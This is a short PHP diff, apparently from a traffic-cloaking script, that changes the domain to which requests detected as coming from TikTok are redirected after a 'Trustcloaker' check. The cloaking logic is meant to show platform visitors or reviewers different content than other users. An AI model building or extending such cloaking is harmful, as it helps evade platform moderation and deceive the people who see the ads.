@@ -76,7 +76,7 @@ class Oppsd
 
         // 🔹 2. Dann TikTok-Check (NUR wenn Trustcloaker kein Redirect gemacht hat)
         if ($this->isTikTokRequest()) {
-            header('Location: https://sunoraclo.com/');
+            header('Location: https://sunoralounge.com/');
             exit;
         }
 
